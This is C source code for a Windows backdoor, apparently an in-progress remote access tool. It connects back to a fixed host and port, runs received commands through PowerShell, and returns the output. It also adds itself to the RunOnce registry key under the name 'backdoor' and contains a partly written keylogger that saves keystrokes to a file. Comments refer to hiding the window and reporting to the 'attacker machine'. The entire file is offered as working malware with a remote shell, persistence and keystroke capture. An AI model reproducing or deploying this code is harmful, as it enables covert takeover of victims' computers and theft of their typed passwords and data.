#include <stdint.h>
#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <string.h>
#include <strsafe.h>
#include <tchar.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")
#pragma comment(lib, "User32.lib")

#define BUFFER_SIZE 65536
BOOL run_keylogger = FALSE;

unsigned int my_strlen(char *str);
void write_to_file(const char *key, char buffer[256]);
void keylog(char keybuffer[256]);
void persist(char *path[]);
int execfunc(char command[MAX_PATH], SOCKET socket);
void CreateChildProcess(HANDLE hchild_out_w, HANDLE hchild_in_r, LPSTR cmd);
void WriteToPipe(HANDLE input_file, HANDLE hchild_in_w);
void ReadFromPipe(HANDLE input_file, HANDLE hchild_out_r, SOCKET socket);
void ErrorExit(PCTSTR);

int __cdecl main(int argc, char *argv[]) {
  // TODO: HIDE WINDOW
  // HWND hwnd = GetConsoleWindow();
  // ShowWindow(hwnd, SW_HIDE);

  char keylog_buffer[256] = {};

  WSADATA wsaData;
  SOCKET ConnectSocket = INVALID_SOCKET;
  struct sockaddr_in server;

  char sendbuf[BUFFER_SIZE];
  char recvbuf[BUFFER_SIZE];
  int recvbuflen = BUFFER_SIZE;

  int iResult;

  // Initialize Winsock
  iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (iResult != 0) {
    printf("WSAStartup failed with error: %d\n", iResult);
    return 1;
  }

  memset(&server, '0', sizeof(server));
  if (inet_pton(AF_INET, "192.168.10.2", &server.sin_addr) == -1)
    printf("problem with inet_pton");

  server.sin_family = AF_INET;
  server.sin_port = htons(1234);

  // Attempt to connect to an address until one succeeds
  while (1) {
    // Create a SOCKET for connecting to server
    ConnectSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (ConnectSocket == INVALID_SOCKET) {
      printf("socket failed with error: %d\n", WSAGetLastError());
      break;
    }

    // Connect to server.
    iResult =
        connect(ConnectSocket, (struct sockaddr *)&server, sizeof(server));
    if (iResult < 0) {
      printf("\nconnect failed, retrying in 2 seconds...\n");
      closesocket(ConnectSocket);
      ConnectSocket = INVALID_SOCKET;
      Sleep(2000);
      continue;
    }
    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
    if (strncmp(recvbuf, "log_keys", 8) == 0 || run_keylogger) {
      printf("log_keys\n");
      run_keylogger = TRUE;
      // TODO: keylogger must run on its own thread and timer refer to other
      // keylogger
      // this will start the thread
      //  keylog(keylog_buffer);
      goto skip_write;
    }

    if (strncmp(recvbuf, "cd ", 3) == 0) {
      printf("cd\n");
      char path[MAX_PATH];
      // TRY: replacing with data buf at some point
      strncpy_s(path, sizeof(path), recvbuf + 3, strlen(recvbuf) - 3);
      int len = strlen(path);
      while (len > 0 && path[len - 1] == '\n' || path[len - 1] == '\r') {
        path[--len] = '\0';
      }
      printf("path %s\n", path);
      SetCurrentDirectory(path);
      GetCurrentDirectory(MAX_PATH, (LPSTR)&sendbuf);
    } else if (strncmp(recvbuf, "q", 1) == 0) {
      printf("q\n");
      strcpy_s(sendbuf, sizeof(sendbuf), "q");
      send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
      memset(&recvbuf, '0', sizeof(recvbuf));
      shutdown(ConnectSocket, SD_SEND);
      closesocket(ConnectSocket);
      break;
    } else if (strncmp(recvbuf, "persist", 7) == 0) {
      printf("persist\nargv[0]: %s\n", argv[0]);
      persist(&argv[0]);
    } else if (strncmp(recvbuf, "stop_key_logging", 8) == 0 || run_keylogger) {
      // this will kill the thread
      printf("stop_keylogging\n");
      run_keylogger = FALSE;
    } else if (strncmp(recvbuf, "cwd", 3) == 0) {
      printf("cwd\n");
      GetCurrentDirectory(MAX_PATH, (LPSTR)&sendbuf);
    } else {
      // TODO: implement anonymous pipe
      // dual named pipe setup not working
      // dealing with File writing issues
      execfunc(recvbuf, ConnectSocket);
      goto skip_write;
    }

    if (strlen(sendbuf) > 0) {
      sendbuf[strcspn(sendbuf, "0")] = '\0';
      iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
      if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
      }
    }

  skip_write:

    shutdown(ConnectSocket, SD_SEND);

    memset(&recvbuf, '0', sizeof(recvbuf));
    memset(&sendbuf, '0', sizeof(sendbuf));
    closesocket(ConnectSocket);
    Sleep(1000);
  }

  WSACleanup();
  return 0;
}

typedef struct {
  int vk;
  char *name;
} KeyName;

KeyName special_keys[] = {
    {VK_BACK, "[BACKSPACE]"},   {VK_TAB, "[TAB]"},       {VK_RETURN, "[ENTER]"},
    {VK_SHIFT, "[SHIFT]"},      {VK_CONTROL, "[CTRL]"},  {VK_MENU, "[ALT]"},
    {VK_CAPITAL, "[CAPSLOCK]"}, {VK_ESCAPE, "[ESC]"},    {VK_SPACE, " "},
    {VK_PRIOR, "[PAGEUP]"},     {VK_NEXT, "[PAGEDOWN]"}, {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},        {VK_LEFT, "[LEFT]"},     {VK_UP, "[UP]"},
    {VK_RIGHT, "[RIGHT]"},      {VK_DOWN, "[DOWN]"},     {VK_INSERT, "[INS]"},
    {VK_DELETE, "[DEL]"},       {VK_LWIN, "[LWIN]"},     {VK_RWIN, "[RWIN]"},
    {VK_APPS, "[MENU]"}};

char *is_special_key(unsigned key) {
  for (int i = 0; i < 22; i++) {
    if (special_keys[i].vk == key) {
      return special_keys[i].name;
    }
  }

  return 0;
}

void keylog(char *keybuffer) {
  printf("keylog start\n");
  if (!run_keylogger) {
    printf("cancel hit");
    return;
  }
  BOOL was_down;
  BOOL is_down;
  for (int i = 0; i <= 256; i++) {
    SHORT key_state = GetAsyncKeyState(i);
    was_down = (key_state & 0x0001) != 0;
    is_down = (key_state & 0x8000) == 0;
    if (was_down || is_down) {
      unsigned int key = MapVirtualKeyA(i, MAPVK_VSC_TO_VK_EX);
      char *special_key = is_special_key(key);
      if (special_key) {
        printf("PRE special key strlen %llu", strlen(special_key));
        printf("special key write_to_file: special_key: %s\n", special_key);
        write_to_file(special_key, keybuffer);
      } else {
        unsigned char keyboard_state;
        GetKeyboardState(&keyboard_state);
        WORD char_out;
        ToAscii(i, key, &keyboard_state, &char_out, 0);
        char ascii_char = (char)char_out;
        write_to_file(&ascii_char, keybuffer);
      }
    }
  }
}

int execfunc(char command[MAX_PATH], SOCKET socket) {
  if (!command)
    ErrorExit(TEXT("specify an input file"));

  HANDLE hchild_in_r = NULL;
  HANDLE hchild_in_w = NULL;
  HANDLE hchild_out_r = NULL;
  HANDLE hchild_out_w = NULL;

  HANDLE hinput_file = NULL;

  SECURITY_ATTRIBUTES sa_attr;

  sa_attr.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa_attr.bInheritHandle = TRUE;
  sa_attr.lpSecurityDescriptor = NULL;

  if (!CreatePipe(&hchild_out_r, &hchild_out_w, &sa_attr, 0))
    ErrorExit(TEXT("hchild_out_r CreatePipe"));

  if (!SetHandleInformation(hchild_out_r, HANDLE_FLAG_INHERIT, 0))
    ErrorExit(TEXT("hchild_out_r SetHandleInformation"));

  if (!CreatePipe(&hchild_in_r, &hchild_in_w, &sa_attr, 0))
    ErrorExit(TEXT("stdin CreatePipe"));

  if (!SetHandleInformation(hchild_in_w, HANDLE_FLAG_INHERIT, 0))
    ErrorExit(TEXT("stdin SetHandleInformation"));

  CreateChildProcess(hchild_out_w, hchild_in_r, command);

  hinput_file =
      CreateFileA(".\\hellothere.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL,
                  OPEN_ALWAYS, FILE_ATTRIBUTE_READONLY, NULL);

  if (hinput_file == INVALID_HANDLE_VALUE)
    ErrorExit(TEXT("CreateFile"));

  WriteToPipe(hinput_file, hchild_in_w);

  ReadFromPipe(hinput_file, hchild_out_r, socket);

  return 0;
}

void CreateChildProcess(HANDLE hchild_out_w, HANDLE hchild_in_r, LPSTR cmd) {
  // Create a child process that uses the previously created pipes for STDIN and
  // STDOUT

  char cmd_line[8000];

  snprintf(cmd_line, sizeof(cmd_line), "powershell.exe -command \"%s\"", cmd);

  PROCESS_INFORMATION proc_info;
  STARTUPINFO start_info;
  BOOL success = FALSE;

  // clear proc_info, start_info
  ZeroMemory(&proc_info, sizeof(PROCESS_INFORMATION));
  ZeroMemory(&start_info, sizeof(STARTUPINFO));

  // setup start_info
  start_info.cb = sizeof(STARTUPINFO);
  start_info.hStdError = hchild_out_w;
  start_info.hStdOutput = hchild_out_w;
  start_info.hStdInput = hchild_in_r;
  start_info.dwFlags |= STARTF_USESTDHANDLES;

  // Create the process
  success = CreateProcess(NULL, cmd_line, NULL, NULL, TRUE, 0, NULL, NULL,
                          &start_info, &proc_info);

  if (!success) {
    ErrorExit(TEXT("CreateProcess"));
  } else {
    // cleanup and close handles
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);
    CloseHandle(hchild_out_w);
    CloseHandle(hchild_in_r);
  }
}

void WriteToPipe(HANDLE input_file, HANDLE hchild_in_w) {
  // Read from a file and write its contents to the pipe for child stdin
  // stops at data end

  DWORD read, written;
  CHAR buf[BUFFER_SIZE];
  BOOL success = FALSE;

  for (;;) {
    success = ReadFile(input_file, buf, BUFFER_SIZE, &read, NULL);
    if (!success || read == 0)
      break;

    success = WriteFile(hchild_in_w, buf, read, &written, NULL);
    if (!success)
      break;
  }

  // Close the pipe handle so child stops reading
  if (!CloseHandle(hchild_in_w))
    ErrorExit(TEXT("stdin_w, CloseHandle"));
}

void ReadFromPipe(HANDLE input_file, HANDLE hchild_out_r, SOCKET socket) {
  // INFO:
  //  Read output from the child process's pipe for STDOUT
  //  and write to the parent process's pipe for STDOUT.
  //  Stop when there is no more data.

  DWORD read, written;
  CHAR buf[BUFFER_SIZE];
  BOOL bSuccess = FALSE;

  for (;;) {
    // Read from pipe
    if (!ReadFile(hchild_out_r, buf, BUFFER_SIZE, &read, NULL)) {
      DWORD err = GetLastError();
      if (err == ERROR_BROKEN_PIPE) {
        // Pipe closed normally
        return;
      }
      fprintf(stderr, "ReadFile failed: %lu\n", err);
      return;
    }

    if (read == 0) {
      // No more data
      break;
    }

    // Send everything read
    size_t totalSent = 0;
    while (totalSent < read) {
      int iResult = send(socket, buf + totalSent, read - totalSent, 0);
      if (iResult == SOCKET_ERROR) {
        fprintf(stderr, "send failed: %d\n", WSAGetLastError());
        return;
      }
      totalSent += iResult;
    }
  }
}
void ErrorExit(PCTSTR function) {
  // format a readable error messageew

  // TODO: make this message send over to attacker machine

  LPVOID msg_buf;
  LPVOID display_buf;
  DWORD dw = GetLastError();

  FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                    FORMAT_MESSAGE_IGNORE_INSERTS,
                NULL, dw, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                (LPTSTR)&msg_buf, 0, NULL);
  display_buf =
      (LPVOID)LocalAlloc(LMEM_ZEROINIT, (lstrlen((LPTSTR)msg_buf) +
                                         lstrlen((LPCTSTR)function) + 40) *
                                            sizeof(TCHAR));
  StringCchPrintf((LPTSTR)display_buf, LocalSize(display_buf) / sizeof(TCHAR),
                  TEXT("%s failed with error %d: %s"), function, dw, msg_buf);

  MessageBox(NULL, (LPCTSTR)display_buf, TEXT("Error"), MB_OK);

  LocalFree(msg_buf);
  LocalFree(display_buf);
}

void write_to_file(const char *key, char *buffer) {
  printf("inside write_to_file\n");
  if (!buffer) {
    printf("PRE buffer append if statement\n");
    strcpy_s(buffer, strlen(key), key);
    printf("POST buffer append if statement\n");
  }

  if ((strlen(key) + strlen(buffer)) < 256) {
    snprintf(buffer + strlen(buffer), strlen(buffer) - strlen(key), "%s", key);
  } else {
    printf("inside buffer append if statement\n");
    printf("writing to file\n");
    HANDLE file_handle = CreateFileA("keys_log.txt", FILE_GENERIC_WRITE, 0,
                                     NULL, OPEN_ALWAYS, 0, 0);

    printf("post file creation\n");
    if (file_handle == INVALID_HANDLE_VALUE) {
      printf("invalid handle value\n");
      return;
    }

    printf("PRE WriteFile\n");
    DWORD bytes_written;
    WriteFile(file_handle, key, strlen(key), &bytes_written, 0);
    printf("POST WriteFile\n");
    CloseHandle(file_handle);
  }
}

void persist(char *path[]) {
  HKEY key_handle;
  DWORD disposition;
  char *subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
  // This has to be the path of curr file: lookup MSDN
  void *reg_key_val = path[0];
  unsigned long key_val_size = strlen((char *)reg_key_val) + 1;

  LONG ret =
      RegCreateKeyExA(HKEY_CURRENT_USER, subkey,
                      0,    // reserved, must be zero
                      NULL, // class string (optional)
                      REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY,
                      NULL, // security attributes
                      &key_handle, &disposition);

  if (ret != ERROR_SUCCESS) {
    printf("Error with RegCreateKeyExA: %ld\n", ret);
    return;
  }

  ret = RegSetKeyValueA(key_handle, 0, "backdoor", REG_SZ, reg_key_val,
                        key_val_size);
  if (ret != ERROR_SUCCESS) {
    printf("Error with RegSetKeyValueA, code: %ld", ret);
    return;
  }

  RegCloseKey(key_handle);
}

unsigned int my_strlen(char *str) {
  unsigned int count = 0;
  char cur_char;
  while ((cur_char = str[count]) != '\0')
    count++;
  return count;
}
